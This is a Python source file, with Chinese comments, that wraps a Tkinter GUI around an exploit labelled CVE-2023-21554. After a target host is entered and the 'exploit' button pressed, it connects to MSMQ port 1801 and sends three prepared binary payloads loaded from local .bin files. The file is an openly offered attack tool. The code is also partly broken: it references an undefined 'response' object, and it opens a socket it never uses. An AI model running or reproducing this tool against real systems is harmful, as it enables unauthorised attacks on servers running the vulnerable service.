# 需要自行修改 ip_address
# 代码中的循环是一开始用于测试的，没有实际用途

import socket, time
import tkinter
from tkinter import *
import tkinter as tk
from tkinter.ttk import *
from time import strftime
from tkinter import ttk
def ip_address():
    root = tkinter.Tk()
    root.title("CVE-2023-21554 exploits")
    root.geometry('800x600+0+0')
    def printInput():
        inp = inputtxt.get(1.0, "end-1c")
        lbl.config(text = "attack url : "+inp)
        ip_address = inp
        base_path = ".\\data\\"
        port = 1801

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip_address, port))

        f = open(base_path + "establish_connection.bin", "rb")
        ec = f.read()
        f.close()

        f = open(base_path + "connection_parameters.bin", "rb")
        cp = f.read()
        f.close()

        f = open(base_path + "user_message.bin", "rb")
        um = f.read()
        data = bytearray(um)
        f.close()

#f = open(base_path + "session_acknowledgment.bin", "rb")
#sa = f.read()
#f.close()

        for i in range(0, 1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip_address, port))
            scroll_y = Scrollbar(root, orient=VERTICAL)
            txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
            scroll_y.pack(side=RIGHT, fill=Y)
            scroll_y.config(command=txtarea.yview)
            sock.sendall(ec)
            txtarea.insert(END, "[+] Establish connection.")
            #print("[+] Establish connection.")
            #sock.recv(1024)
            txtarea.insert(END, sock.recv(1024))
            txtarea.insert(END, "[+] Receive data done.")
           # print("[+] Receive data done.")

            sock.sendall(cp)
            txtarea.insert(END, "[+] Connection parameters.")
            txtarea.insert(END, sock.recv(1024))
            txtarea.insert(END, "[+] Receive data done.")
           # print("[+] Connection parameters.")
           # sock.recv(1024)
           # print("[+] Receive data done.")

    #data[0x5e] = i
    #data[0x5f] = 0xff
            sock.sendall(data)
            txtarea.insert(END, "[+] User message.")
            txtarea.insert(END, sock.recv(1024))
            txtarea.insert(END, "[+] Receive data done.")
            #print("[+] User message.")
            #sock.recv(1024)
            #print("[+] Receive data done.")

    #sock.sendall(sa)
    #print("[+] Session acknowledgment.")
    #sock.recv(1024)
    #print("[+] Receive data done.\n")

            sock.close()

            time.sleep(0.1)
            txtarea.insert(END, response.text)
            txtarea.pack(fill=BOTH, expand=True)
            txtarea.configure(state ='disabled')
    Hacher = Label(root, text="Enter domin www.example.com or 107.1.01.0 : ").pack()
    inputtxt = tk.Text(root,height = 1,width = 80)
    inputtxt.pack()
    printButton = tk.Button(root,text = "exploit", command = printInput)
    printButton.pack()
    lbl = tk.Label(root, text = "")
    lbl.pack()
    root.mainloop()
    
